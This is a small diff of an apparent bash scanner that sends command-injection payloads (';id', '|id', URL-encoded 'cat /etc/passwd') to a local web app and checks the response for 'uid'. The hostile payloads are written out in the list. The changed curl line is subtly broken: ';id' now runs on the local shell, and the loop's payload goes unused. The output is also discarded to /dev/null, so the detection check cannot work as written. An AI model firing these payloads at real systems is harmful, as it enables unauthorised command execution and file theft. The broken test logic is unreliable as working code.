@@ -14,7 +14,7 @@ payloads=(";id" "|id" "a);id" "%0Acat%20/etc/passwd" "%0A/usr/bin/id" "%0Aid" "%
 for payload in "${payloads[@]}"
 do
     # Send the payload to the server
-    response=$(curl -s -o /dev/null 'http://localhost:3000/app/something'$payload)
+    response=$(curl -s -o /dev/null 'http://localhost:3000/app/something';id)
     if [[ $response == *"uid"* ]]; then
         
         echo "RCE vulnerability exists"
